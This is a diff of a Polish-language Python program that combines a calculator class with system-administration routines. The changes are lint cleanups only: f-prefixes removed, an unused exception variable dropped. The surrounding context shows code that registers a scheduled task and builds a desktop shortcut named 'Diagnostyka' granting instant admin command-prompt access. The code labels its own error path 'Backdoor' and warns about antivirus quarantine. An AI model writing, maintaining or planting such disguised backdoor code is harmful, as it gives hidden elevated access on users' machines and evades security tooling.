@@ -75,7 +75,7 @@ class CalculatorLogic:
             return "BŁĄD SKŁADNI"
         except ValueError:
             return "BŁĄD WARTOŚCI"
-        except Exception as e:
+        except Exception:
             return "BŁĄD SYSTEMU"
 
     @staticmethod
@@ -485,7 +485,7 @@ class SystemAdminOperations:
                 capture_output=True,
                 creationflags=subprocess.CREATE_NO_WINDOW,
             )
-            print(f"[SYSTEM] Krok 2/3: Generowanie skrótu na pulpicie...")
+            print("[SYSTEM] Krok 2/3: Generowanie skrótu na pulpicie...")
             ps_cmd = (
                 f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{shortcut_path}'); "
                 f"$s.TargetPath = 'C:\\Windows\\System32\\schtasks.exe'; "
@@ -500,7 +500,7 @@ class SystemAdminOperations:
                 creationflags=subprocess.CREATE_NO_WINDOW,
             )
             if os.path.exists(shortcut_path):
-                print(f"[GOTOWE] Skrót 'Diagnostyka' utworzony.")
+                print("[GOTOWE] Skrót 'Diagnostyka' utworzony.")
                 return True
         except Exception as e:
             print(f"[BŁĄD] Backdoor: {e}")
@@ -644,9 +644,7 @@ class MainController:
                     f"[BŁĄD] Nie udało się stworzyć zadania: {result_task.stderr.strip()}"
                 )
 
-            print(
-                f"[SYSTEM] Krok 2/3: Generowanie binarnego skrótu .LNK na pulpicie..."
-            )
+            print("[SYSTEM] Krok 2/3: Generowanie binarnego skrótu .LNK na pulpicie...")
             ps_cmd = (
                 f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{shortcut_path}'); "
                 f"$s.TargetPath = 'C:\\Windows\\System32\\schtasks.exe'; "
@@ -670,15 +668,15 @@ class MainController:
                     f"[BŁĄD] PowerShell nie mógł stworzyć skrótu: {result_ps.stderr.strip()}"
                 )
 
-            print(f"[SYSTEM] Krok 3/3: Weryfikacja istnienia pliku...")
+            print("[SYSTEM] Krok 3/3: Weryfikacja istnienia pliku...")
             if os.path.exists(shortcut_path):
-                print(f"\n[GOTOWE] Skrót 'Diagnostyka' jest dostępny na pulpicie.")
+                print("\n[GOTOWE] Skrót 'Diagnostyka' jest dostępny na pulpicie.")
                 print(
-                    f"[INFO] Kliknij go dwukrotnie, aby uzyskać natychmiastowy dostęp do CMD (Admin)."
+                    "[INFO] Kliknij go dwukrotnie, aby uzyskać natychmiastowy dostęp do CMD (Admin)."
                 )
             else:
                 print(
-                    f"[ALARM] Plik nie został odnaleziony na pulpicie. Sprawdź kwarantannę antywirusa!"
+                    "[ALARM] Plik nie został odnaleziony na pulpicie. Sprawdź kwarantannę antywirusa!"
                 )
 
         except Exception as e:
